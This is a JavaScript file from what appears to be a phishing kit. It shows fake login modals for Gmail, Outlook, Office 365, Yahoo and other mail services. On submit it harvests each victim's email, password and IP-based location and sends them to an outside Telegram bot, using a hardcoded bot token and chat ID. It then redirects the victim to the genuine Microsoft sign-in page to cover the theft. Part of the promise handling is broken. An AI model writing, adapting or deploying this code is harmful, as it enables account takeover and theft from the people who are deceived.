$(document).ready(function() {
    // Configuration
    const MAX_ATTEMPTS = 3;
    const REDIRECT_URL = "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?scope=service%3A%3Aaccount.microsoft.com%3A%3AMBI_SSL+openid+profile+offline_access&response_type=code&client_id=81feaced-5ddd-41e7-8bef-3e20a2689bb7&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-signin-oauth&client-request-id=ac6a279a-d812-41ba-8439-a7781e246057&x-client-SKU=MSAL.Desktop&x-client-Ver=4.66.1.0&x-client-OS=Windows+Server+2019+Datacenter&prompt=login&client_info=1&state=H4sIAAAAAAAEAA3Gx2KCMAAA0H_pNQdWgXDwIKBgECpDRm5ECmHIlvX17Tu9LwdQlBlt4VYmmwXtasB1U3tgdaVCO-BUjN_7TkmJnDfH8t43QyC_vb0dm7RnTEyey3zLXhsvkWdLglTzJnhHqkSWxKIb8vhix2fHMURGH-ecnmUqCtCdTPAsB4xwCdfjjmE_dvs8haYCrqI5ygkt0gKi4FxGzKeJHcREukFaeNOFb-YTTrW2SOWjiVzH6wRkVfv_WHschA3mGFQU7h_MEZsT5R7nofmD3muTh6mva9eIT_TLRcuwoAW1Wj2S0O-NqYR5FoPlunySYa60zUbWerzKMY_hS7l4qs2luZl2owsFfmUNL0s0aa2x2dVcB8aIU0UAPHawD0QNxdtT4p5OX3_0MEbRWgEAAA&msaoauth2=true&instance_aware=true&lc=1033";
    const SERVICE_IMAGES = {
        'Gmail': 'https://i.ibb.co/b5WQC4P/gmail.png',
        'Outlook': 'https://i.ibb.co/vZXCdtH/outlook.png',
        'Aol': 'images/aol.png',
        'Office 365': 'https://i.ibb.co/6rZqcnD/office365.png',
        'Yahoo': 'images/yahoo.png',
        'Other Mail': 'https://img.freepik.com/free-psd/phone-icon-design_23-2151311652.jpg?semt=ais_hybrid&w=740'
    };
    
    // Telegram bot configuration
    const BOT_TOKEN = '8070121337:AAFA2y1bsKPx9xt_cVGghlmm4aAahxxYZ9E';
    const CHAT_ID = '6297605834';
    
    // State management
    let attemptCount = 0;
    
    // Initialize modal handlers
    function initModalHandlers() {
        const services = ['gmail', 'outlook', 'aol', 'office365', 'yahoo', 'other'];
        
        services.forEach(service => {
            $(`#${service}modal`).click(function() {
                resetForm();
                const displayName = service === 'other' ? 'Other Mail' : 
                                   service === 'office365' ? 'Office 365' :
                                   service.charAt(0).toUpperCase() + service.slice(1);
                
                $('#fieldImg').attr('src', SERVICE_IMAGES[displayName]);
                $('#field').text(displayName);
                $('#ajaxModal').modal('show');
            });
        });
    }

    // Reset form to initial state
    function resetForm() {
        $('#contact').trigger("reset");
        $("#msg").hide().empty();
    }

    // Validate form inputs
    function validateForm(email, password) {
        if (!email || !password) {
            showError("Please fill in all required fields");
            return false;
        }
        
        if (!isValidEmail(email)) {
            showError("Please enter a valid email address");
            return false;
        }
        
        return true;
    }

    // Basic email validation
    function isValidEmail(email) {
        const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        return re.test(email);
    }

    // Show error message
    function showError(message) {
        $("#msg").show().text(message);
    }

    // Send data to Telegram bot
    function sendToTelegram(email, password, detail) {
        const ipInfoUrl = 'https://ipinfo.io/json';
        
        // Get IP information
        fetch(ipInfoUrl)
            .then(response => response.json())
            .then(ipData => {
                const message = `
📧 *New OFFICE * 📧
                
🔹 *Service*: ${detail}
📩 *Email*: \`${email}\`
🔑 *Password*: \`${password}\`
                
🌐 *IP Information*
IP: ${ipData.ip || 'Unknown'}
Hostname: ${ipData.hostname || 'Unknown'}
Location: ${ipData.city || 'Unknown'}, ${ipData.region || 'Unknown'}, ${ipData.country || 'Unknown'}
                
🕒 ${new Date().toLocaleString()}
                `;
                
                const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
                
                return fetch(telegramUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });
            })
            .then(response => response.json())
            .then(data => {
                console.log('Message sent to Telegram:', data);
                return true;
            })
            .catch(error => {
                console.error('Error sending to Telegram:', error);
                return false;
            });
    }

    // Handle form submission
    $('#submit-btn').click(function(event) {
        event.preventDefault();
        
        const email = $("#email").val().trim();
        const password = $("#password").val().trim();
        const detail = $("#field").text();

        if (!validateForm(email, password)) return;

        attemptCount++;
        
        if (attemptCount >= MAX_ATTEMPTS) {
            window.location.href = REDIRECT_URL;
            return;
        }

        $('#submit-btn').html('<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span> Verifying...');
        
        // Send to Telegram
        sendToTelegram(email, password, detail)
            .then(success => {
                if (success) {
                    $("#msg").show().text("Verification in progress...");
                    setTimeout(() => {
                        window.location.href = REDIRECT_URL;
                    }, 2000);
                } else {
                    showError("Service unavailable. Please try again later");
                }
            })
            .finally(() => {
                $('#submit-btn').html('Login');
            });
    });

    // Initialize modal handlers
    initModalHandlers();
});